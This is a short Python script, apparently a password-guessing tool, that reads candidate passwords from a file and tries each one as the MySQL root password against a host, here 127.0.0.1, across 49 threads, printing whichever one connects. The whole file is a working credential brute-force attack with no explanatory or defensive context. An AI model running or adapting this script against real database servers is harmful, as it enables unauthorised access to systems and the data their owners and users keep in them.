import pymysql
from threading import Thread


def find(f, addr):
    for i in f:
        try:
            con = pymysql.Connect(host=addr, port=3306, user='root', passwd=i.strip("\r\n"), charset='utf8', )
            print("pass=", i)
        except pymysql.Error:
            print("Error")


f = open('log.txt')
addr = '127.0.0.1'

for i in range(1, 50):
    t = Thread(target=find, args=(f, addr))
    t.start()
